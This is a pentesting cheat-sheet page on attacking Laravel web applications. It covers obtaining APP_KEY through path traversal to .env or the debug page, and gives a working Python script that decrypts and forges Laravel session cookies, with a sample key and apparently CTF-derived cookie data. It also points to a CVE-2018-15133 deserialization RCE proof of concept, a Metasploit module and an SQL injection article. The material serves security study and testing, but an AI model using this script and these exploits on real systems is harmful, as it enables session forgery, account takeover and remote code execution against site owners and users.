# Laravel

## Laravel Tricks

### .env

Laravel saves the APP it uses to encrypt the cookies and other credentials inside a file called `.env` that can be accessed using some path traversal under: `/../.env`

Laravel will also show this information inside the debug page \(that appears when Laravel finds an error and it's activated\).

Using the secret APP\_KEY of Laravel you can decrypt and re-encrypt cookies:

### Decrypt Cookie

```python
import os
import json
import hashlib
import sys
import hmac
import base64
import string
import requests
from Crypto.Cipher import AES
from phpserialize import loads, dumps

#https://gist.github.com/bluetechy/5580fab27510906711a2775f3c4f5ce3

def mcrypt_decrypt(value, iv):
    global key
    AES.key_size = 128
    crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
    return crypt_object.decrypt(value)


def mcrypt_encrypt(value, iv):
    global key
    AES.key_size = 128
    crypt_object = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
    return crypt_object.encrypt(value)


def decrypt(bstring):
    global key
    dic = json.loads(base64.b64decode(bstring).decode())
    mac = dic['mac']
    value = bytes(dic['value'], 'utf-8')
    iv = bytes(dic['iv'], 'utf-8')
    if mac == hmac.new(key, iv+value, hashlib.sha256).hexdigest():
        return mcrypt_decrypt(base64.b64decode(value), base64.b64decode(iv))
        #return loads(mcrypt_decrypt(base64.b64decode(value), base64.b64decode(iv))).decode()
    return ''


def encrypt(string):
    global key
    iv = os.urandom(16)
    #string = dumps(string)
    padding = 16 - len(string) % 16
    string += bytes(chr(padding) * padding, 'utf-8')
    value = base64.b64encode(mcrypt_encrypt(string, iv))
    iv = base64.b64encode(iv)
    mac = hmac.new(key, iv+value, hashlib.sha256).hexdigest()
    dic = {'iv': iv.decode(), 'value': value.decode(), 'mac': mac}
    return base64.b64encode(bytes(json.dumps(dic), 'utf-8'))

app_key ='HyfSfw6tOF92gKtVaLaLO4053ArgEf7Ze0ndz0v487k='
key = base64.b64decode(app_key)
decrypt('eyJpdiI6ImJ3TzlNRjV6bXFyVjJTdWZhK3JRZ1E9PSIsInZhbHVlIjoiQ3kxVDIwWkRFOE1sXC9iUUxjQ2IxSGx1V3MwS1BBXC9KUUVrTklReit0V2k3TkMxWXZJUE02cFZEeERLQU1PV1gxVForYkd1dWNhY3lpb2Nmb0J6YlNZR28rVmk1QUVJS3YwS3doTXVHSlhcL1JGY0t6YzhaaGNHR1duSktIdjF1elwvNXhrd1Q4SVlXMzBrbTV0MWk5MXFkSmQrMDJMK2F4cFRkV0xlQ0REVU1RTW5TNVMrNXRybW9rdFB4VitTcGQ0QlVlR3Vwam1IdERmaDRiMjBQS05VXC90SzhDMUVLbjdmdkUyMnQyUGtadDJHSEIyQm95SVQxQzdWXC9JNWZKXC9VZHI4Sll4Y3ErVjdLbXplTW4yK25pTGxMUEtpZVRIR090RlF0SHVkM0VaWU8yODhtaTRXcVErdUlhYzh4OXNacXJrVytqd1hjQ3FMaDhWeG5NMXFxVXB1b2V2QVFIeFwvakRsd1pUY0h6UUR6Q0UrcktDa3lFOENIeFR0bXIrbWxOM1FJaVpsTWZkSCtFcmd3aXVMZVRKYXl0RXN3cG5EMitnanJyV0xkU0E3SEUrbU0rUjlENU9YMFE0eTRhUzAyeEJwUTFsU1JvQ3d3UnIyaEJiOHA1Wmw1dz09IiwibWFjIjoiNmMzODEzZTk4MGRhZWVhMmFhMDI4MWQzMmRkNjgwNTVkMzUxMmY1NGVmZWUzOWU4ZTJhNjBiMGI5Mjg2NzVlNSJ9')
#b'{"data":"a:6:{s:6:\\"_token\\";s:40:\\"vYzY0IdalD2ZC7v9yopWlnnYnCB2NkCXPbzfQ3MV\\";s:8:\\"username\\";s:8:\\"guestc32\\";s:5:\\"order\\";s:2:\\"id\\";s:9:\\"direction\\";s:4:\\"desc\\";s:6:\\"_flash\\";a:2:{s:3:\\"old\\";a:0:{}s:3:\\"new\\";a:0:{}}s:9:\\"_previous\\";a:1:{s:3:\\"url\\";s:38:\\"http:\\/\\/206.189.25.23:31031\\/api\\/configs\\";}}","expires":1605140631}\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e'
encrypt(b'{"data":"a:6:{s:6:\\"_token\\";s:40:\\"RYB6adMfWWTSNXaDfEw74ADcfMGIFC2SwepVOiUw\\";s:8:\\"username\\";s:8:\\"guest60e\\";s:5:\\"order\\";s:8:\\"lolololo\\";s:9:\\"direction\\";s:4:\\"desc\\";s:6:\\"_flash\\";a:2:{s:3:\\"old\\";a:0:{}s:3:\\"new\\";a:0:{}}s:9:\\"_previous\\";a:1:{s:3:\\"url\\";s:38:\\"http:\\/\\/206.189.25.23:31031\\/api\\/configs\\";}}","expires":1605141157}')

```

### Laravel Deserialization RCE

Vulnerable versions: 5.5.40 and 5.6.x through 5.6.29 \([https://www.cvedetails.com/cve/CVE-2018-15133/](https://www.cvedetails.com/cve/CVE-2018-15133/)\)

Here you can find information about the deserialization vulnerability here: [https://labs.f-secure.com/archive/laravel-cookie-forgery-decryption-and-rce/](https://labs.f-secure.com/archive/laravel-cookie-forgery-decryption-and-rce/)

You can test and exploit it using [https://github.com/kozmic/laravel-poc-CVE-2018-15133](https://github.com/kozmic/laravel-poc-CVE-2018-15133)  
Or you can also exploit it with metasploit: `use unix/http/laravel_token_unserialize_exec`

### Laravel SQLInjection

Read information about this here: [https://stitcher.io/blog/unsafe-sql-functions-in-laravel](https://stitcher.io/blog/unsafe-sql-functions-in-laravel)

